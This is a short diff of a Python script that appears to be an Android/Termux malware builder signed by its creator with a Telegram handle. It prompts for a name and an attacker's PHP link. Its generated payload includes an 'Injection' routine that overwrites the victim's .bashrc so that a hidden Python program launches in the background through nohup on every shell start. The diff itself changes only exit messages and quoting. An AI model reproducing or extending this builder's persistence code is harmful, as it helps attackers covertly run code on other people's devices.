@@ -93,7 +93,7 @@ CREATOR ZeyadAlabany tele[sxtz0]
              self.MainMenu()
        except ValueError:
           print("PLEASE CHOOSING NUMBERSS")
-          self.MainMenu()
+          sys.exit('CHOOSING NUMBERS! Follow My TELE : @srtly')
           
     def Br3k(self):
        for letter in self.Banner():
@@ -101,7 +101,7 @@ CREATOR ZeyadAlabany tele[sxtz0]
           sys.stdout.write(self.red+letter)  
           sys.stdout.flush()
        subprocess.Popen('am start https://t.me/sxtz0',stdout=subprocess.PIPE,shell=True)
-       sys.exit()
+       sys.exit('bye bye')
     def python(self):
       x = input("ENTER NAME :")
       y = input("Give Me Your Link of your php")
@@ -336,7 +336,8 @@ per()
    def Injection(self): ##name here
        with open(self.bashrc,"w")as bash:
            bash.write(f"nohup python {{self.inj}} > /dev/null 2>&1 &")               
-Zeyad()                        ''')
+Zeyad()
+                       ''')
       print(f"{self.blue}GO TO {self.path} AND YOU GET {x}")
       time.sleep(3)
       self.MainMenu()
